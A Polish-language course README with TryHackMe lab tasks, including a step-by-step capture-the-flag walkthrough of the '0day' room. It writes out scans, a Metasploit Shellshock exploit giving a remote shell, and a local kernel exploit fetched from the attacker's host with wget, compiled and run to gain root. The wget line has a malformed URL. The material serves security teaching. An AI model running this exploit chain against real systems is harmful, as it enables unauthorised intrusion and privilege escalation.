# BAWiM
Fuzzing, Zero-day attack, Authentication Failure

## Wymagania
* Wirtualnie bądź natywnie zainstalowana dystrybucja linux

## Zadanie 1 - Fuzz Faster U Fool
Wchodzimy na stronę: https://tryhackme.com/room/ffuf<br />
Należy się zalogować a jeśli nie posiada się jeszcze konta to stworzyć darmowe konto. <br />
Następnie postępujemy zgodnie z intrukcją tam zawartą.

Instalacja podstawowych narzędzi <br />
sudo apt -y install ffuf (jeśli nie działa to https://github.com/ffuf/ffuf)<br />
sudo apt -y install seclists (jeśli nie działa to https://github.com/danielmiessler/SecLists#install<br />
sudo apt install openvpn<br />

Po uruchomieniu Maszyny na TryHackMe klikamy w nasz profil i z ctr klikamy w Access.<br />
Natepnie pobieramy My configuration File.<br />
sudo openvpn path/to/file.ovpn  - pozwala nam połączyć się z maszynką

Nastepnie wchodzimy w przeglądarce na IP Adress, który znajduje się wyżej i jeśli wyświetli nam się strona z napisem "DVWA" to znaczy, że udało nam się połączyć.<br />
Postepujemy już dalej z instrukcją na stronie.

## Zadanie 2 - 0day Walkthrough
Wchodzimy na stronę: https://tryhackme.com/room/0day<br />
Tak samo jak w poprzednim zadaniu, uruchamiamy maszynę i łączymy się z nią przez Openvpn<br />
Naszym zadaniem jest włamac się na stronę.

Spróbuj samemu ale jeśli ci się nie uda to,<br />
<b>poniżej będzie znajdować się instrukcja jak przejść przez ten proces krok po kroku. </b>

Na poczatku zawsze warto przeskanować sobie otwarte porty na naszej maszynie<br />
nmap -sV -sC  -oN service-scam <ip maszyny> (jeśli nie mamy nmap instalujemy - sudo apt -y install nmap)<br />
![image](https://user-images.githubusercontent.com/103604178/214099482-b9a0e03b-0513-4b9d-a1cc-c7f26f4a025f.png)
Widzimy, że port 22 i 80 są otwarte

Następnie szukamy ukrytych katalogów
ffuf -u http://ip_maszyny/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt<br />
![image](https://user-images.githubusercontent.com/103604178/214101318-2eff5d3c-8486-4352-b79b-c0ce92e534cb.png)

Nastepnie stosujemy
nikto -h http://ip_maszyny (jesli nie mamy instalujemy - sudo apt -y install nikto)<br />
![image](https://user-images.githubusercontent.com/103604178/214102537-7e764940-c20e-4a35-9693-d16ba07026c8.png)
W wyniku zauważamy ciekawą opcję jaką jest "shellshock" <br />

teraz włączamy metasploit console komendą: msfconsole<br />
search shellshock - ta komenda pokazuje nam różne podatności w tej rodzinie (Shellshock)<br />
Nas interesuje ta z Apache mod_cgi Bash, ponieważ widzieliśmy wcześniej, że nasz serwer korzysta z apache<br />
uruchamiamy ten o nazwie exploti/multi/http/apache_mod_cgi_bash_env_exec za pomocą komendy: use <numer > <br />
set rhosts ip_maszyny - ustawiamy ip maszyny<br />
set targeturi /cgi-bin/test.cgi - ustawiamy target naszego uri, ten ponieważ wcześniej sprawdziliśmy, że może byc podatny.<br />
set lhost ip_nasze - wchodzimy w nowym terminalu wpisujemy ifconfig i kopiujemy inet z tun0<br />
exploit - uruchamiamy naszego exploita

Następnie tworzy nam się sesja<br />
shell - tworzy nam się nowy procec<br />
python -c 'import pty;pty.spawn("/bin/bash")'<br />
cd /home/ryan <br />
cat user.txt - i mamy naszą pierwszą flage

Teraz wpisujemy: uname -a <br />
Otrzymujemy ubuntu 3.13.0<br />
W nowym terminalu wpisujemy: searchsploit ubuntu 3.13.0<br />
sudo searchsploit -m linux/local/37292.c - powinien nam się pojawic w katalogu<br />
python -m SimpleHTTPServer - tworzymy prosty serwer

Wracamy teraz do naszego poprzedniego shella<br />
wget http://ip_nasz/8000/37292.c - wgrywamy sobie metasploita<br />
gcc 37292.c -o explo -kompilujemy<br />
chmod +x explo<br />
./explo<br />
cat /root/root.txt - otrzymujemy naszą drugą flagę
